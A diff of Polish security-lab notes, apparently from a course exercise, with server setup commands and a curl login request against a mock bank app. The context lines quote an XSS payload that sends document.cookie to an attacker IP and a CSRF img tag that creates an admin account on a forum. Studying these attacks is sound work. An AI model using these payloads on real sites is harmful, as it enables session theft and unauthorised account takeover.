@@ -11,3 +11,16 @@ mogłoby być coś na kształt:
 <script>new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;</script>
 albo:
 Atakujący rejestruje konto, podając w swoim loginie tag: <img src=”http://pro-forum.sekurak/admin/addUser?login=malgorzata4&pass=1234&type=adm”>
+
+
+2.
+$ gunicorn -c conf/gunicorn_config.py Bezp_5.wsgi
+$ sudo kilall apache2
+$ sudo fuser -k 80/tcp
+$ sudo fuser -k 443/tcp
+$ sudo service nginx start
+or
+$ sudo systemctl start nginx
+
+3.
+curl -X POST -d '{"username": "test", "password": "ple,kto123"}'  --cookie "csrftoken=d5etPXexOEgmpAl6Yk02VlVWcubwP4hnvKAlPmbKU2NvxQXnhdPSEfoTvY3B2HRq" mojwspanialybank:8000/login/
